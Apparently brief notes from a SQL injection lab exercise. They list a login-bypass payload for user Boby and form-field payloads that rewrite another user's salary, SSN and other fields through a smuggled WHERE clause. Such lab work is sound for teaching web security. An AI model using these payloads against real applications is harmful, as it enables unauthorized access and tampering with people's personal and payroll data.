Login as Boby:
in login page (FORM1):
USERNAME: Boby'; -- 
n.b. with space at the end of -- 



update the states (FORM2):
Alice's value get from the db

NickName: ', EID = 1000, Salary = 20000, birth = '9/20', SSN = 10211002 where Name = 'Boby'; -- 
n.b. with space at the end of -- 



What would happen if we changed also ID and Name
NickName: ', ID = 1, EID = 1000, Salary = 20000, birth = '9/20', SSN = 10211002 where Name = 'Boby'; -- 
n.b. with space at the end of -- 


ID and Name are primary key, thay can't be the same
